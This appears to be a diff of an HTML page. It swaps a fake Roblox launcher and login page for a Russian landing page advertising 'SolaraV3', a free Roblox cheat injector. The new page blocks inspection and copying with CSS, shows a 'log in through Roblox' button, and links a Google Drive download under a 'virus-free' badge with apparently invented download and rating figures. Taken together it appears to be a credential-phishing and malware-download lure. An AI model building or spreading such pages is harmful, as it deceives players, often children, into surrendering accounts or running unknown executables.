@@ -1,496 +1,1499 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
-    <title>Roblox</title>
-    <link rel="icon" href="https://images.rbxcdn.com/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SolaraV3 — Бесплатный инжектор для Roblox</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
-        :root{--bg:#191b1f;--card:rgba(35,37,39,0.95);--text:#fff;--muted:#bdbebe;--input-bg:#191b1f;--input-border:#3a3d41;--input-focus:#00b06f;--btn:#00b06f;--error:#e94560;--warn:#f0c040}
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;color:var(--text);min-height:100vh;overflow:hidden;background:#000}
-        
-        .launcher{position:fixed;top:0;left:0;width:100%;height:100%;z-index:100;display:flex;flex-direction:column;align-items:center;justify-content:center;background:url('https://i.ibb.co/xSSM5dBW/2026-06-19-113530.png') center/cover no-repeat;transition:opacity .8s ease,visibility .8s ease}
-        .launcher::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5)}
-        .launcher.hide{opacity:0;visibility:hidden}
-        .launcher-content{position:relative;z-index:1;text-align:center}
-        .launcher-logo{font-family:"Arial Black",sans-serif;font-size:48px;font-weight:900;margin-bottom:30px;color:#fff;animation:pulse 1.5s ease-in-out infinite}
-        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.7}}
-        .spinner-big{width:60px;height:60px;border:4px solid rgba(255,255,255,.15);border-top-color:#00b06f;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
-        @keyframes spin{to{transform:rotate(360deg)}}
-        .launcher-status{font-size:15px;color:#ccc;margin-top:10px;transition:all .4s ease}
-        .launcher-error{font-size:15px;color:#e94560;margin-top:12px;font-weight:500;opacity:0;transform:translateY(10px);transition:all .5s ease}
-        .launcher-error.show{opacity:1;transform:translateY(0)}
-        
-        .main-page{position:fixed;top:0;left:0;width:100%;height:100%;opacity:0;visibility:hidden;transition:opacity .8s ease,visibility .8s ease;display:flex;justify-content:center;align-items:center;padding:20px;background:url('https://www.gamespot.com/a/uploads/screen_kubrick/1597/15975876/4050363-roblox.jpg') center/cover no-repeat}
-        .main-page::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7)}
-        .main-page.show{opacity:1;visibility:visible}
-        .wrap{width:100%;max-width:420px;position:relative;z-index:1;animation:fadeUp .6s ease;max-height:95vh;overflow-y:auto}
-        @keyframes fadeUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
-        .logo{text-align:center;margin-bottom:28px}.logo svg{width:150px}
-        .card{background:var(--card);border-radius:12px;padding:28px;backdrop-filter:blur(20px)}
-        .card h1{font-size:24px;font-weight:700;margin-bottom:4px}
-        .card .sub{font-size:13px;color:var(--muted);margin-bottom:20px}
-        .fld{margin-bottom:14px;position:relative}
-        .fld label{display:block;font-size:12px;font-weight:600;color:var(--muted);margin-bottom:4px}
-        .fld input{width:100%;height:42px;padding:0 50px 0 14px;background:var(--input-bg);border:1px solid var(--input-border);border-radius:8px;color:var(--text);font-size:15px;outline:none;transition:all .15s}
-        .fld input:focus{border-color:var(--input-focus);box-shadow:0 0 0 3px rgba(0,176,111,.18)}
-        .fld input.invalid{border-color:var(--error)}
-        .fld .counter{position:absolute;right:12px;top:34px;font-size:11px;color:var(--muted);pointer-events:none}
-        .fld .counter.warn{color:var(--warn)}.fld .counter.full{color:var(--btn)}.fld .counter.error{color:var(--error)}
-        .fld .hint{font-size:11px;color:var(--error);margin-top:4px;display:none}
-        .fld .hint.show{display:block}.fld .hint.warn{color:var(--warn)}
-        .btn{width:100%;height:42px;background:var(--btn);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:6px;transition:all .2s}.btn:hover{opacity:.9}.btn:disabled{opacity:.5;pointer-events:none}
-        .btn-back{width:100%;height:42px;background:transparent;color:var(--muted);border:1px solid var(--input-border);border-radius:8px;font-size:14px;font-weight:500;cursor:pointer;margin-top:6px}.btn-back:hover{background:rgba(255,255,255,.05)}
-        .err{background:var(--error);color:#fff;padding:8px 12px;border-radius:8px;font-size:12px;margin-bottom:14px;display:none}
-        .info-box{background:rgba(240,192,64,.1);border:1px solid rgba(240,192,64,.3);color:var(--warn);padding:8px 12px;border-radius:8px;font-size:12px;margin-bottom:14px;display:none}
-        .footer{text-align:center;margin-top:18px;font-size:12px;color:var(--muted)}.footer a{color:var(--muted);text-decoration:none;cursor:pointer}
-        .load{text-align:center;padding:25px 0;display:none}.load.active{display:block}
-        .spinner{width:32px;height:32px;border:3px solid rgba(0,176,111,.2);border-top-color:#00b06f;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto 10px}
-        .code-boxes{display:flex;gap:7px;justify-content:center;margin-bottom:18px}
-        .code-box{width:42px;height:48px;background:var(--input-bg);border:1px solid var(--input-border);border-radius:8px;text-align:center;font-size:22px;font-weight:700;color:var(--text);outline:none;transition:all .15s}.code-box:focus{border-color:var(--input-focus);box-shadow:0 0 0 3px rgba(0,176,111,.18)}
-        .ver-title{text-align:center;font-size:17px;font-weight:700;margin-bottom:4px}
-        .ver-sub{text-align:center;font-size:12px;color:var(--muted);margin-bottom:20px}
-        .resend-link{text-align:center;margin-top:14px;font-size:12px}.resend-link a{color:var(--btn);text-decoration:none;cursor:pointer}.resend-link a.disabled{color:var(--muted);pointer-events:none}
-        .signup-link{text-align:center;margin-top:14px;font-size:12px;color:var(--muted)}.signup-link a{color:var(--btn);text-decoration:none;cursor:pointer}
-        .success-msg{text-align:center;padding:15px;display:none}.success-msg .check{font-size:40px;margin-bottom:8px}
-        .suggestions{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px}
-        .suggestions span{background:var(--input-bg);border:1px solid var(--input-border);border-radius:14px;padding:4px 10px;font-size:11px;color:var(--muted);cursor:pointer;transition:all .15s}
-        .suggestions span:hover{border-color:var(--input-focus);color:var(--text)}
-        .strength-bar{height:3px;border-radius:2px;margin-top:4px;transition:all .3s;width:0%}
-        .strength-bar.weak{width:30%;background:var(--error)}.strength-bar.medium{width:60%;background:var(--warn)}.strength-bar.strong{width:100%;background:var(--btn)}
+        /* ===== ЗАЩИТА ОТ F12, ВЫДЕЛЕНИЯ И КОПИРОВАНИЯ ===== */
+        * {
+            -webkit-user-select: none !important;
+            -moz-user-select: none !important;
+            -ms-user-select: none !important;
+            user-select: none !important;
+            -webkit-touch-callout: none !important;
+        }
+        body {
+            -webkit-user-select: none !important;
+            -moz-user-select: none !important;
+            -ms-user-select: none !important;
+            user-select: none !important;
+            -webkit-touch-callout: none !important;
+        }
+        /* Разрешаем выделение только в полях ввода */
+        input, textarea, button, .btn, .btn-option, .btn-roblox, .btn-primary, .btn-secondary, .btn-send, .logout-btn, .close-btn, .tab-btn, .nav-links a, .btn-outline {
+            -webkit-user-select: text !important;
+            -moz-user-select: text !important;
+            -ms-user-select: text !important;
+            user-select: text !important;
+            -webkit-touch-callout: text !important;
+        }
+        /* Запрет выделения для всего остального */
+        .hero-badges, .badge-float, .logo, .feature-card, .review-card, .faq-item, .stats, .footer, .injector-panel, .greeting, .status, .support-card, .chat-box, .message {
+            -webkit-user-select: none !important;
+            -moz-user-select: none !important;
+            -ms-user-select: none !important;
+            user-select: none !important;
+        }
+
+        /* Дополнительная защита от выделения через псевдоэлементы */
+        ::selection {
+            background: transparent !important;
+            color: inherit !important;
+        }
+        ::-moz-selection {
+            background: transparent !important;
+            color: inherit !important;
+        }
+
+        /* Защита от копирования через контекстное меню */
+        img, svg {
+            -webkit-user-drag: none !important;
+            user-drag: none !important;
+            pointer-events: none !important;
+        }
+
+        /* ===== СТИЛИ ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        :root {
+            --bg: #0a0c10;
+            --card: #14181c;
+            --border: #2a3038;
+            --text: #e8edf5;
+            --muted: #8892a0;
+            --primary: #7c3aed;
+            --primary-glow: rgba(124,58,237,0.3);
+            --gradient: linear-gradient(135deg, #7c3aed, #a855f7, #6366f1);
+            --success: #22c55e;
+            --error: #ef4444;
+            --warning: #fbbf24;
+            --roblox-red: #e03a3a;
+        }
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            line-height: 1.6;
+            padding: 0 20px;
+        }
+        .container { max-width: 1200px; margin: 0 auto; }
+        @keyframes fadeUp { from { opacity:0; transform:translateY(40px); } to { opacity:1; transform:translateY(0); } }
+        @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
+        @keyframes pulseGlow { 0%,100% { box-shadow:0 0 20px var(--primary-glow); } 50% { box-shadow:0 0 60px var(--primary-glow),0 0 120px rgba(124,58,237,0.1); } }
+        @keyframes float { 0%,100% { transform:translateY(0); } 50% { transform:translateY(-12px); } }
+        @keyframes gradientMove { 0% { background-position:0% 50%; } 50% { background-position:100% 50%; } 100% { background-position:0% 50%; } }
+        .animate-fade-up { animation: fadeUp 0.8s ease forwards; }
+        .animate-fade-up-delay { animation: fadeUp 0.8s ease 0.2s forwards; opacity:0; }
+        .animate-fade-up-delay-2 { animation: fadeUp 0.8s ease 0.4s forwards; opacity:0; }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid var(--border);
+            flex-wrap: wrap;
+            gap: 16px;
+            animation: fadeIn 0.6s ease;
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: 900;
+            background: var(--gradient);
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: gradientMove 4s ease infinite;
+            cursor: pointer;
+            pointer-events: none;
+        }
+        .logo span { font-weight:300; -webkit-text-fill-color:var(--muted); }
+        .nav-links { display:flex; gap:28px; align-items:center; flex-wrap:wrap; }
+        .nav-links a { color:var(--muted); text-decoration:none; font-size:15px; font-weight:500; transition:0.3s; position:relative; cursor:pointer; }
+        .nav-links a::after { content:''; position:absolute; bottom:-4px; left:0; width:0%; height:2px; background:var(--gradient); transition:0.3s; }
+        .nav-links a:hover { color:var(--text); }
+        .nav-links a:hover::after { width:100%; }
+        .nav-links .btn-outline { padding:8px 20px; border:1px solid var(--primary); border-radius:30px; color:var(--primary); font-weight:600; transition:0.3s; background:transparent; }
+        .nav-links .btn-outline::after { display:none; }
+        .nav-links .btn-outline:hover { background:var(--primary); color:#fff; box-shadow:0 0 30px var(--primary-glow); }
+        .nav-links .btn-roblox { padding:8px 20px; border-radius:30px; background:var(--roblox-red); color:#fff; font-weight:600; transition:0.3s; border:none; cursor:pointer; }
+        .nav-links .btn-roblox:hover { background:#c42a2a; transform:scale(1.05); }
+
+        .hero { display:grid; grid-template-columns:1fr 1fr; gap:60px; align-items:center; padding:60px 0 40px; }
+        .hero h1 { font-size:52px; font-weight:900; line-height:1.1; background:var(--gradient); background-size:200% 200%; -webkit-background-clip:text; -webkit-text-fill-color:transparent; animation:gradientMove 5s ease infinite; pointer-events: none; }
+        .hero h1 .highlight { background:none; -webkit-text-fill-color:#fff; display:inline-block; position:relative; }
+        .hero h1 .highlight::after { content:''; position:absolute; bottom:2px; left:0; width:100%; height:8px; background:var(--primary); opacity:0.3; border-radius:4px; }
+        .hero p { color:var(--muted); font-size:18px; margin:20px 0 30px; line-height:1.8; max-width:520px; pointer-events: none; }
+        .hero-badges { display:flex; gap:16px; flex-wrap:wrap; margin-bottom:24px; pointer-events: none; }
+        .hero-badges span { background:var(--card); border:1px solid var(--border); padding:6px 16px; border-radius:30px; font-size:13px; color:var(--muted); display:inline-flex; align-items:center; gap:6px; }
+        .hero-badges span .dot { width:6px; height:6px; border-radius:50%; background:var(--success); display:inline-block; animation:pulseGlow 2s infinite; }
+        .download-btn-wrap { display:flex; gap:16px; flex-wrap:wrap; }
+        .btn-primary { display:inline-flex; align-items:center; gap:10px; background:var(--gradient); background-size:200% 200%; animation:gradientMove 4s ease infinite; color:#fff; padding:18px 40px; border-radius:50px; font-weight:700; font-size:18px; text-decoration:none; transition:0.3s; border:none; cursor:pointer; box-shadow:0 8px 32px var(--primary-glow); }
+        .btn-primary:hover { transform:scale(1.05); box-shadow:0 12px 48px var(--primary-glow); }
+        .btn-secondary { display:inline-flex; align-items:center; gap:10px; background:var(--card); color:var(--text); padding:18px 32px; border-radius:50px; font-weight:600; font-size:16px; text-decoration:none; border:1px solid var(--border); transition:0.3s; cursor:pointer; }
+        .btn-secondary:hover { border-color:var(--primary); background:rgba(124,58,237,0.1); }
+        .hero-image { text-align:center; position:relative; pointer-events: none; }
+        .hero-image .glow { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); width:80%; height:80%; background:radial-gradient(circle, rgba(124,58,237,0.15), transparent 70%); border-radius:50%; z-index:0; animation:pulseGlow 4s infinite; }
+        .hero-image img { max-width:100%; border-radius:24px; border:1px solid var(--border); position:relative; z-index:1; box-shadow:0 20px 60px rgba(0,0,0,0.5); pointer-events: none; -webkit-user-drag: none; }
+        .hero-image .badge-float { position:absolute; bottom:20px; right:-10px; background:var(--card); border:1px solid var(--border); padding:12px 18px; border-radius:14px; font-size:13px; color:var(--muted); z-index:2; animation:float 3s ease-in-out infinite; backdrop-filter:blur(10px); pointer-events: none; }
+
+        .features { padding:60px 0 40px; border-top:1px solid var(--border); }
+        .features h2 { text-align:center; font-size:36px; font-weight:800; margin-bottom:12px; pointer-events: none; }
+        .features .subtitle { text-align:center; color:var(--muted); font-size:17px; margin-bottom:40px; pointer-events: none; }
+        .features-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(240px,1fr)); gap:24px; }
+        .feature-card { background:var(--card); border:1px solid var(--border); border-radius:20px; padding:28px 24px; text-align:center; transition:0.4s; animation:fadeUp 0.8s ease forwards; opacity:0; pointer-events: none; }
+        .feature-card:hover { transform:translateY(-6px); border-color:var(--primary); box-shadow:0 12px 40px rgba(124,58,237,0.08); }
+        .feature-card .icon { font-size:40px; margin-bottom:12px; }
+        .feature-card h3 { font-size:18px; font-weight:700; margin-bottom:6px; }
+        .feature-card p { color:var(--muted); font-size:14px; line-height:1.6; }
+
+        .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:24px; padding:40px 0; border-top:1px solid var(--border); text-align:center; pointer-events: none; }
+        .stats .stat h3 { font-size:32px; font-weight:800; background:var(--gradient); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+        .stats .stat p { color:var(--muted); font-size:14px; margin-top:4px; }
+
+        .auth-section { background:var(--card); border-radius:28px; padding:48px 44px; margin:40px 0; border:1px solid var(--border); animation:fadeUp 0.8s ease; transition:0.3s; }
+        .auth-section:hover { border-color:rgba(124,58,237,0.2); }
+        .tabs { display:flex; gap:4px; background:var(--bg); border-radius:14px; padding:4px; margin-bottom:24px; border:1px solid var(--border); }
+        .tab-btn { flex:1; padding:12px; border:none; background:transparent; color:var(--muted); font-weight:600; border-radius:12px; cursor:pointer; transition:0.3s; font-family:'Inter', sans-serif; font-size:14px; }
+        .tab-btn.active { background:var(--card); color:var(--text); box-shadow:0 4px 12px rgba(0,0,0,0.2); }
+        .tab-btn:hover { color:var(--text); }
+        .panel-hidden { display:none !important; }
+        .form-group { margin-bottom:18px; }
+        .form-group label { display:block; font-size:13px; font-weight:600; color:var(--muted); margin-bottom:6px; }
+        .form-group input { width:100%; padding:14px 18px; background:var(--bg); border:1px solid var(--border); border-radius:14px; color:var(--text); font-size:15px; outline:none; transition:0.3s; font-family:'Inter', sans-serif; }
+        .form-group input:focus { border-color:var(--primary); box-shadow:0 0 0 4px var(--primary-glow); }
+        .form-group .hint { font-size:12px; color:var(--muted); margin-top:4px; opacity:0.7; }
+        .password-strength {
+            height: 4px;
+            border-radius: 4px;
+            margin-top: 4px;
+            transition: 0.3s;
+            width: 0%;
+        }
+        .password-strength.weak { width: 30%; background: var(--error); }
+        .password-strength.medium { width: 60%; background: var(--warning); }
+        .password-strength.strong { width: 100%; background: var(--success); }
+        .btn { width:100%; padding:16px; background:var(--gradient); background-size:200% 200%; animation:gradientMove 4s ease infinite; border:none; border-radius:14px; color:#fff; font-weight:700; font-size:16px; cursor:pointer; transition:0.3s; margin-top:4px; font-family:'Inter', sans-serif; }
+        .btn:hover { transform:scale(1.02); box-shadow:0 8px 32px var(--primary-glow); }
+        .alert { padding:12px 16px; border-radius:12px; margin-bottom:16px; display:none; font-size:14px; }
+        .alert.error { display:block; background:rgba(239,68,68,0.12); border:1px solid var(--error); color:var(--error); }
+        .alert.success { display:block; background:rgba(34,197,94,0.12); border:1px solid var(--success); color:var(--success); }
+        .hwid-info { font-size:12px; color:var(--muted); text-align:center; margin-top:14px; opacity:0.6; }
+        .hwid-info strong { color:var(--text); }
+        .guarantee-box { background:rgba(34,197,94,0.08); border:1px solid rgba(34,197,94,0.2); border-radius:12px; padding:12px 16px; margin-top:12px; font-size:13px; color:var(--success); text-align:center; display:flex; align-items:center; justify-content:center; gap:8px; }
+
+        .injector-panel { text-align:center; padding:30px 0; }
+        .injector-panel h3 { font-size:28px; font-weight:700; }
+        .injector-panel .greeting { color:var(--muted); margin-bottom:20px; }
+        .injector-panel .btn-group { display:flex; gap:12px; justify-content:center; flex-wrap:wrap; }
+        .injector-panel .btn-group .btn-option { background:var(--bg); border:1px solid var(--border); padding:14px 28px; border-radius:14px; color:var(--text); font-weight:600; cursor:pointer; transition:0.3s; font-family:'Inter', sans-serif; font-size:15px; }
+        .injector-panel .btn-group .btn-option:hover { border-color:var(--primary); background:rgba(124,58,237,0.08); transform:translateY(-2px); }
+        .injector-panel .status { margin:20px 0; color:var(--success); font-size:15px; min-height:28px; }
+        .injector-panel .logout-btn { background:transparent; border:1px solid var(--error); color:var(--error); padding:10px 28px; border-radius:30px; font-weight:600; cursor:pointer; transition:0.3s; font-family:'Inter', sans-serif; font-size:14px; }
+        .injector-panel .logout-btn:hover { background:var(--error); color:#fff; }
+
+        .reviews { padding:40px 0; border-top:1px solid var(--border); }
+        .reviews h2 { text-align:center; font-size:32px; font-weight:800; margin-bottom:8px; pointer-events: none; }
+        .reviews .subtitle { text-align:center; color:var(--muted); margin-bottom:36px; pointer-events: none; }
+        .review-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(260px,1fr)); gap:24px; }
+        .review-card { background:var(--card); border:1px solid var(--border); border-radius:20px; padding:24px; transition:0.4s; pointer-events: none; }
+        .review-card:hover { border-color:var(--primary); transform:translateY(-4px); }
+        .review-card .stars { color:var(--warning); font-size:18px; letter-spacing:2px; margin-bottom:6px; }
+        .review-card .name { font-weight:700; font-size:15px; }
+        .review-card .role { color:var(--muted); font-size:13px; }
+        .review-card .text { color:var(--muted); font-size:14px; line-height:1.7; margin-top:10px; }
+        .review-form { margin-top:30px; display:flex; gap:12px; flex-wrap:wrap; }
+        .review-form input { flex:1; padding:12px 16px; background:var(--bg); border:1px solid var(--border); border-radius:14px; color:var(--text); font-size:14px; outline:none; min-width:200px; font-family:'Inter', sans-serif; }
+        .review-form input:focus { border-color:var(--primary); box-shadow:0 0 0 4px var(--primary-glow); }
+        .review-form .btn-add-review { padding:12px 24px; background:var(--gradient); background-size:200% 200%; animation:gradientMove 4s ease infinite; border:none; border-radius:14px; color:#fff; font-weight:600; cursor:pointer; font-family:'Inter', sans-serif; transition:0.3s; }
+        .review-form .btn-add-review:hover { transform:scale(1.04); box-shadow:0 8px 32px var(--primary-glow); }
+
+        .faq { padding:40px 0; border-top:1px solid var(--border); }
+        .faq h2 { text-align:center; font-size:32px; font-weight:800; margin-bottom:36px; pointer-events: none; }
+        .faq-grid { display:grid; grid-template-columns:1fr 1fr; gap:24px; }
+        .faq-item { background:var(--card); border:1px solid var(--border); border-radius:16px; padding:20px 24px; transition:0.3s; pointer-events: none; }
+        .faq-item:hover { border-color:var(--primary); }
+        .faq-item h4 { font-weight:600; margin-bottom:4px; }
+        .faq-item p { color:var(--muted); font-size:14px; line-height:1.6; }
+
+        .support-section { padding:40px 0; border-top:1px solid var(--border); }
+        .support-section h2 { text-align:center; font-size:32px; font-weight:800; margin-bottom:8px; pointer-events: none; }
+        .support-section .subtitle { text-align:center; color:var(--muted); margin-bottom:30px; pointer-events: none; }
+        .support-card { background:var(--card); border-radius:28px; padding:36px 32px; border:1px solid var(--border); max-width:700px; margin:0 auto; transition:0.3s; }
+        .support-card:hover { border-color:rgba(124,58,237,0.2); }
+        .chat-box { background:var(--bg); border-radius:16px; padding:16px; height:280px; overflow-y:auto; border:1px solid var(--border); margin-bottom:16px; display:flex; flex-direction:column; gap:8px; pointer-events: none; }
+        .chat-box .message { pointer-events: none; }
+        .chat-box .message.user { pointer-events: none; }
+        .chat-box .message.bot { pointer-events: none; }
+        .chat-box::-webkit-scrollbar { width:5px; }
+        .chat-box::-webkit-scrollbar-track { background:var(--bg); }
+        .chat-box::-webkit-scrollbar-thumb { background:var(--border); border-radius:8px; }
+        .message { max-width:85%; padding:10px 14px; border-radius:14px; font-size:14px; line-height:1.5; animation:fadeUp 0.3s ease; word-wrap:break-word; pointer-events: none; }
+        .message.user { align-self:flex-end; background:var(--primary); color:#fff; border-bottom-right-radius:4px; }
+        .message.bot { align-self:flex-start; background:var(--card); border:1px solid var(--border); color:var(--text); border-bottom-left-radius:4px; }
+        .message .time { font-size:10px; opacity:0.5; margin-top:4px; display:block; }
+        .message.bot .time { color:var(--muted); }
+        .message.user .time { color:rgba(255,255,255,0.6); }
+        .typing-indicator { display:none; align-self:flex-start; background:var(--card); border:1px solid var(--border); border-radius:14px; padding:10px 16px; font-size:14px; color:var(--muted); border-bottom-left-radius:4px; animation:fadeUp 0.3s ease; pointer-events: none; }
+        .input-row { display:flex; gap:10px; }
+        .input-row input { flex:1; padding:12px 16px; background:var(--bg); border:1px solid var(--border); border-radius:14px; color:var(--text); font-size:15px; outline:none; transition:0.3s; font-family:'Inter', sans-serif; }
+        .input-row input:focus { border-color:var(--primary); box-shadow:0 0 0 4px var(--primary-glow); }
+        .input-row input::placeholder { color:var(--muted); opacity:0.6; }
+        .input-row .btn-send { padding:12px 24px; background:var(--gradient); background-size:200% 200%; animation:gradientMove 4s ease infinite; border:none; border-radius:14px; color:#fff; font-weight:700; font-size:15px; cursor:pointer; transition:0.3s; white-space:nowrap; font-family:'Inter', sans-serif; }
+        .input-row .btn-send:hover { transform:scale(1.04); box-shadow:0 8px 32px var(--primary-glow); }
+        .support-footer { margin-top:14px; text-align:center; font-size:13px; color:var(--muted); }
+
+        footer { border-top:1px solid var(--border); padding:30px 0; margin-top:40px; text-align:center; color:var(--muted); font-size:14px; }
+        footer .links { display:flex; justify-content:center; gap:24px; margin-bottom:12px; flex-wrap:wrap; }
+        footer .links a { color:var(--muted); text-decoration:none; transition:0.3s; font-size:14px; cursor:pointer; }
+        footer .links a:hover { color:var(--text); }
+
+        .modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1000; justify-content:center; align-items:center; padding:20px; }
+        .modal-overlay.active { display:flex; }
+        .modal-content { background:var(--card); border-radius:24px; padding:40px; max-width:600px; width:100%; max-height:80vh; overflow-y:auto; border:1px solid var(--border); position:relative; }
+        .modal-content h2 { margin-bottom:16px; font-size:24px; }
+        .modal-content p { color:var(--muted); font-size:15px; line-height:1.8; margin-bottom:16px; }
+        .modal-content .close-btn { background:var(--primary); border:none; color:#fff; padding:10px 24px; border-radius:12px; font-weight:600; cursor:pointer; font-family:'Inter', sans-serif; transition:0.3s; }
+        .modal-content .close-btn:hover { opacity:0.8; }
+        .modal-content::-webkit-scrollbar { width:5px; }
+        .modal-content::-webkit-scrollbar-track { background:var(--bg); }
+        .modal-content::-webkit-scrollbar-thumb { background:var(--border); border-radius:8px; }
+
+        .theme-toggle, .lang-toggle {
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 30px;
+            padding: 6px 14px;
+            color: var(--text);
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            font-size: 13px;
+            transition: 0.3s;
+        }
+        .theme-toggle:hover, .lang-toggle:hover { border-color: var(--primary); background: var(--card); }
+
+        .header-controls { display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
+
+        .suggestions-inline {
+            margin-top: 12px;
+            padding: 12px 16px;
+            background: var(--bg);
+            border-radius: 14px;
+            border: 1px solid var(--border);
+        }
+        .suggestions-inline textarea {
+            width: 100%;
+            padding: 10px 14px;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            color: var(--text);
+            font-size: 14px;
+            outline: none;
+            transition: 0.3s;
+            font-family: 'Inter', sans-serif;
+            resize: vertical;
+            min-height: 60px;
+        }
+        .suggestions-inline textarea:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 4px var(--primary-glow);
+        }
+        .suggestions-inline .btn-suggest-inline {
+            margin-top: 8px;
+            padding: 8px 20px;
+            background: var(--gradient);
+            background-size: 200% 200%;
+            animation: gradientMove 4s ease infinite;
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.3s;
+            font-family: 'Inter', sans-serif;
+        }
+        .suggestions-inline .btn-suggest-inline:hover {
+            transform: scale(1.02);
+            box-shadow: 0 4px 16px var(--primary-glow);
+        }
+        .suggestions-inline .suggest-status-inline {
+            font-size: 13px;
+            margin-top: 6px;
+            min-height: 20px;
+        }
+
+        @media (max-width:992px) {
+            .hero { grid-template-columns:1fr; text-align:center; }
+            .hero p { margin-left:auto; margin-right:auto; }
+            .download-btn-wrap { justify-content:center; }
+            .hero-badges { justify-content:center; }
+            .faq-grid { grid-template-columns:1fr; }
+            .hero h1 { font-size:38px; }
+            .auth-section { padding:32px 20px; }
+        }
+        @media (max-width:600px) {
+            header { flex-direction:column; align-items:flex-start; }
+            .nav-links { flex-wrap:wrap; gap:16px; }
+            .hero h1 { font-size:30px; }
+            .btn-primary { padding:14px 28px; font-size:16px; width:100%; justify-content:center; }
+            .btn-secondary { width:100%; justify-content:center; }
+            .auth-section { padding:24px 16px; }
+            .stats { grid-template-columns:1fr 1fr; gap:16px; }
+            .features-grid { grid-template-columns:1fr; }
+            .review-grid { grid-template-columns:1fr; }
+            .injector-panel .btn-group { flex-direction:column; align-items:center; }
+            .injector-panel .btn-group .btn-option { width:100%; max-width:280px; }
+            .faq-grid { grid-template-columns:1fr; }
+            .support-card { padding:20px 16px; }
+            .chat-box { height:200px; }
+            .input-row { flex-direction:column; }
+            .input-row .btn-send { width:100%; justify-content:center; }
+            .message { max-width:92%; font-size:13px; padding:8px 12px; }
+            .modal-content { padding:24px 16px; }
+            .review-form { flex-direction:column; }
+            .review-form input { width:100%; }
+            .review-form .btn-add-review { width:100%; justify-content:center; }
+        }
     </style>
 </head>
 <body>
+<div class="container" id="app">
 
-<div class="launcher" id="launcher">
-    <div class="launcher-content">
-        <div class="launcher-logo">ROBLOX</div>
-        <div class="spinner-big" id="spinnerBig"></div>
-        <p class="launcher-status" id="loadStatus">Starting Roblox...</p>
-        <p class="launcher-error" id="loadError">Connection lost. Reconnecting...</p>
+    <!-- HEADER -->
+    <header>
+        <div class="logo">Solara<span>V3</span></div>
+        <div class="nav-links">
+            <a href="#features">Возможности</a>
+            <a href="#auth">Вход</a>
+            <a href="#reviews">Отзывы</a>
+            <a href="#faq">FAQ</a>
+            <a href="#support">Поддержка</a>
+            <button class="btn-roblox" onclick="showRobloxLogin()">Войти через Roblox</button>
+            <a href="#download" class="btn-outline">Скачать</a>
+            <div class="header-controls">
+                <button class="theme-toggle" id="themeToggle">🌙 Тёмная</button>
+                <button class="lang-toggle" id="langToggle">🇷🇺 RU</button>
+            </div>
+        </div>
+    </header>
+
+    <!-- HERO -->
+    <section class="hero" id="download">
+        <div class="animate-fade-up">
+            <div class="hero-badges">
+                <span><span class="dot"></span> <span data-i18n="downloads">Загрузок: <span id="downloadCounterDisplay">22 319</span></span></span>
+                <span>⭐ <span id="ratingDisplay">4.8</span>/5</span>
+                <span>🛡️ <span data-i18n="virus_free">Без вирусов</span></span>
+                <span>🎮 <span data-i18n="for_roblox">Для Roblox</span></span>
+            </div>
+            <h1 data-i18n="hero_title">Бесплатный <br><span class="highlight">инжектор</span> для Roblox</h1>
+            <p data-i18n="hero_desc">SolaraV3 — мощный, стабильный и безопасный инструмент для инжекции в Roblox. Поддерживает все популярные игры. Обновляется автоматически.</p>
+            <div class="download-btn-wrap">
+                <a href="https://drive.usercontent.google.com/download?id=1DTcqeaHao-dfFfXUEioyeqonxiFFiMNu&export=download&authuser=0&confirm=t&uuid=e5fe58d3-808c-4538-a104-ec6b50fc5e3d&at=AAINaIIkobvPXpxGjUs4W3xwljiR%3A1781888926982" class="btn-primary" id="downloadBtn">
+                    ⬇️ <span data-i18n="download_btn">Скачать SolaraV3</span>
+                </a>
+                <a href="#auth" class="btn-secondary">🔐 <span data-i18n="login_btn">Войти</span></a>
+            </div>
+            <p style="font-size:13px; color:var(--muted); margin-top:12px;" data-i18n="support_os">Поддерживается: Windows 10/11</p>
+        </div>
+        <div class="hero-image animate-fade-up-delay">
+            <div class="glow"></div>
+            <img src="https://placehold.co/600x380/14181c/7c3aed?text=SolaraV3+Interface" alt="SolaraV3 Preview">
+            <div class="badge-float">
+                ⚡ <span data-i18n="version">Версия 3.2.1</span><br>
+                <span style="font-size:11px; color:var(--muted);" data-i18n="updated_today">Обновлено: сегодня</span>
+            </div>
+        </div>
